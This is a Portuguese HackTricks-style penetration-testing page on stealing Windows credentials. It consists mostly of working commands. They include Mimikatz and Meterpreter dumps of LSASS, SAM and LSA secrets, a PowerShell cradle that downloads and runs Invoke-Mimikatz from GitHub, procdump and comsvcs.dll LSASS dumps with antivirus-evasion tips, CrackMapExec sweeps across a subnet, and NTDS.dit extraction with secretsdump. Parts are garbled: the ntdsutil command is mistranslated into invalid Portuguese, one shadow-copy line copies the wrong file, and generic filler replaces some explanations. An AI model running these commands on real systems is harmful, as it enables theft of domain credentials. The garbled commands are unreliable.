# Roubo de Credenciais do Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mimikatz de Credenciais
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encontre outras coisas que o Mimikatz pode fazer** [**neste página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Aprenda sobre algumas possíveis proteções de credenciais aqui.**](credentials-protections.md) **Essas proteções podem impedir que o Mimikatz extraia algumas credenciais.**

## Credenciais com Meterpreter

Use o [**Plugin de Credenciais**](https://github.com/carlospolop/MSF-Credentials) **que** eu criei para **procurar por senhas e hashes** dentro da vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contornando o AV

### Procdump + Mimikatz

Como o **Procdump do** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, ela não é detectada pelo Defender.\
Você pode usar essa ferramenta para **fazer o dump do processo lsass**, **baixar o dump** e **extrair** as **credenciais localmente** do dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Extrair credenciais do dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Este processo é feito automaticamente com o [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso do **procdump.exe para fazer dump do lsass.exe**, isso ocorre porque eles estão **detectando** as strings **"procdump.exe" e "lsass.exe"**. Portanto, é mais **discreto** passar como **argumento** o **PID** do lsass.exe para o procdump **em vez do** nome lsass.exe.

### Fazendo dump do lsass com **comsvcs.dll**

Existe uma DLL chamada **comsvcs.dll**, localizada em `C:\Windows\System32`, que **faz dump da memória do processo** sempre que eles **falham**. Essa DLL contém uma **função** chamada **`MiniDumpW`** que é escrita para ser chamada com `rundll32.exe`.\
Os dois primeiros argumentos não são utilizados, mas o terceiro é dividido em 3 partes. A primeira parte é o ID do processo que será feito o dump, a segunda parte é o local do arquivo de dump e a terceira parte é a palavra **full**. Não há outra opção.\
Uma vez que esses 3 argumentos são analisados, basicamente essa DLL cria o arquivo de dump e faz o dump do processo especificado nesse arquivo de dump.\
Graças a essa função, podemos usar a **comsvcs.dll** para fazer o dump do processo lsass em vez de fazer o upload do procdump e executá-lo. (Essa informação foi extraída de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
Apenas precisamos ter em mente que essa técnica só pode ser executada como **SYSTEM**.

**Você pode automatizar esse processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Extraindo o lsass com o Task Manager**

1. Clique com o botão direito na Barra de Tarefas e clique em Gerenciador de Tarefas
2. Clique em Mais detalhes
3. Procure pelo processo "Local Security Authority Process" na guia Processos
4. Clique com o botão direito no processo "Local Security Authority Process" e clique em "Criar arquivo de despejo".

### Extraindo o lsass com o procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte do conjunto [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
CrackMapExec is a powerful tool used for penetration testing and security assessments. It allows you to perform various tasks, including dumping SAM hashes from Windows systems.

To dump SAM hashes using CrackMapExec, you can use the following command:

```
crackmapexec <target> -u <username> -p <password> --sam
```

Replace `<target>` with the IP address or hostname of the target Windows system. `<username>` and `<password>` should be replaced with valid credentials that have administrative privileges on the target system.

When executed, this command will connect to the target system and dump the SAM hashes, which contain the password hashes for local user accounts. These hashes can be used for further analysis or cracking attempts.

It is important to note that dumping SAM hashes without proper authorization is illegal and unethical. This technique should only be used in controlled environments with proper permission and consent.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Extrair segredos do LSA

O processo de extração de segredos do LSA (Local Security Authority) é uma técnica comum usada por hackers para obter informações confidenciais, como senhas e chaves de criptografia, armazenadas no sistema operacional Windows. Essa técnica é particularmente útil quando um invasor tem acesso privilegiado ao sistema, como um usuário com privilégios de administrador.

O LSA é responsável por armazenar informações de segurança localmente no sistema operacional Windows. Isso inclui senhas de contas de usuário, senhas de serviços e outras informações sensíveis. Ao extrair os segredos do LSA, um invasor pode obter acesso não autorizado a contas de usuário, serviços e outros recursos protegidos.

Existem várias ferramentas disponíveis para extrair os segredos do LSA, como o "Mimikatz". Essas ferramentas exploram vulnerabilidades no sistema operacional Windows para obter acesso aos segredos armazenados no LSA. Uma vez que os segredos são extraídos, eles podem ser usados para realizar ataques adicionais, como autenticação falsa ou acesso não autorizado a sistemas e serviços.

Para proteger-se contra a extração de segredos do LSA, é importante implementar medidas de segurança adequadas, como manter o sistema operacional e os softwares atualizados, usar senhas fortes e complexas, limitar o acesso privilegiado e monitorar regularmente o sistema em busca de atividades suspeitas. Além disso, é recomendável utilizar ferramentas de segurança, como antivírus e firewalls, para detectar e bloquear atividades maliciosas.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extrair o NTDS.dit do DC de destino

Para obter as credenciais armazenadas no Controlador de Domínio (DC) de destino, é necessário extrair o arquivo NTDS.dit. O NTDS.dit é o banco de dados do Active Directory que contém informações sobre usuários, grupos e outros objetos do domínio.

Para realizar essa extração, você pode usar ferramentas como o `ntdsutil` ou o `mimikatz`. Essas ferramentas permitem acessar o NTDS.dit e extrair as credenciais armazenadas nele.

É importante ressaltar que a extração do NTDS.dit requer privilégios de administrador no DC de destino. Além disso, essa ação pode ser detectada pelos sistemas de segurança, portanto, é recomendável realizar essa atividade apenas em um ambiente controlado e autorizado, como durante um teste de penetração.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Despejar o histórico de senhas do NTDS.dit do DC de destino

Para obter acesso às senhas armazenadas no Active Directory, é possível extrair o histórico de senhas do arquivo NTDS.dit em um Controlador de Domínio (DC) de destino. O NTDS.dit é o banco de dados principal do Active Directory, onde as informações de conta de usuário são armazenadas.

Para realizar essa extração, siga as etapas abaixo:

1. Obtenha acesso ao DC de destino.
2. Abra um prompt de comando com privilégios elevados.
3. Execute o seguinte comando para criar uma cópia do arquivo NTDS.dit:

```
ntdsutil "acima do ntds" "cópia de segurança do banco de dados" "criar" "quit"
```

4. Localize o arquivo de backup criado. Por padrão, ele será salvo em `%SystemRoot%\NTDS\` com o nome `ntds.dit.bak`.
5. Copie o arquivo de backup para um local seguro para análise posterior.

Ao extrair o histórico de senhas do NTDS.dit, é possível obter informações valiosas para realizar ataques de força bruta ou tentar quebrar senhas. No entanto, é importante ressaltar que essas atividades devem ser realizadas apenas com permissão legal e ética, como parte de um teste de penetração autorizado.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar o atributo pwdLastSet para cada conta NTDS.dit

Para exibir o atributo pwdLastSet para cada conta NTDS.dit, você pode usar o seguinte comando:

```powershell
Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
```

Isso retornará o nome de cada conta NTDS.dit juntamente com o valor do atributo pwdLastSet.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Roubo de SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode simplesmente copiá-los de forma regular** porque eles estão protegidos.

### Do Registro

A maneira mais fácil de roubar esses arquivos é obter uma cópia do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Você pode realizar a cópia de arquivos protegidos usando esse serviço. Você precisa ser Administrador.

#### Usando o vssadmin

O binário vssadmin está disponível apenas nas versões do Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo usando o **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (o disco rígido usado é "C:" e ele é salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Código do livro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Finalmente, você também pode usar o [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia do SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

O arquivo Ntds.dit é um banco de dados que armazena dados do Active Directory, incluindo informações sobre objetos de usuário, grupos e associação a grupos. Ele inclui os hashes de senha de todos os usuários do domínio.

O importante arquivo NTDS.dit estará localizado em: _%SystemRoom%/NTDS/ntds.dit_\
Este arquivo é um banco de dados _Extensible Storage Engine_ (ESE) e é "oficialmente" composto por 3 tabelas:

* **Tabela de Dados**: Contém as informações sobre os objetos (usuários, grupos...)
* **Tabela de Links**: Informações sobre as relações (membro de...)
* **Tabela SD**: Contém os descritores de segurança de cada objeto

Mais informações sobre isso: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

O Windows usa o _Ntdsa.dll_ para interagir com esse arquivo e é usado pelo _lsass.exe_. Portanto, **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente devido à melhoria de desempenho usando um **cache**).

#### Descriptografando os hashes dentro do NTDS.dit

O hash é cifrado 3 vezes:

1. Descriptografar a Chave de Criptografia de Senha (**PEK**) usando a **BOOTKEY** e **RC4**.
2. Descriptografar o **hash** usando **PEK** e **RC4**.
3. Descriptografar o **hash** usando **DES**.

A **PEK** tem o **mesmo valor** em **todos os controladores de domínio**, mas ela é **cifrada** dentro do arquivo **NTDS.dit** usando a **BOOTKEY** do **arquivo SYSTEM do controlador de domínio (é diferente entre controladores de domínio)**. É por isso que para obter as credenciais do arquivo NTDS.dit **você precisa dos arquivos NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando o NTDS.dit usando o Ntdsutil

Disponível desde o Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o truque do [**volume shadow copy**](./#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do arquivo **SYSTEM** (novamente, [**extraia-o do registro ou use o truque do volume shadow copy**](./#stealing-sam-and-system)).

### **Extraindo hashes do NTDS.dit**

Depois de ter **obtido** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como o _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extrair automaticamente** usando um usuário de administrador de domínio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **arquivos NTDS.dit grandes**, é recomendado extrair usando o [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, você também pode usar o módulo **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**

Os objetos NTDS podem ser extraídos para um banco de dados SQLite com o [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas segredos são extraídos, mas também os objetos inteiros e seus atributos para uma extração de informações mais detalhada quando o arquivo NTDS.dit bruto já foi recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
O arquivo `SYSTEM` é opcional, mas permite a descriptografia de segredos (hashes NT e LM, credenciais suplementares como senhas em texto claro, chaves kerberos ou de confiança, históricos de senhas NT e LM). Juntamente com outras informações, os seguintes dados são extraídos: contas de usuário e máquina com seus hashes, flags UAC, timestamp do último logon e alteração de senha, descrição de contas, nomes, UPN, SPN, grupos e associações recursivas, árvore de unidades organizacionais e associações, domínios confiáveis com tipo de confiança, direção e atributos...

## Lazagne

Baixe o binário daqui [aqui](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar esse binário para extrair credenciais de vários softwares.
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Faça o download dela em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Faça o download em: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) e apenas **execute-o** e as senhas serão extraídas.

## Defesas

[**Aprenda sobre algumas proteções de credenciais aqui.**](credentials-protections.md)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
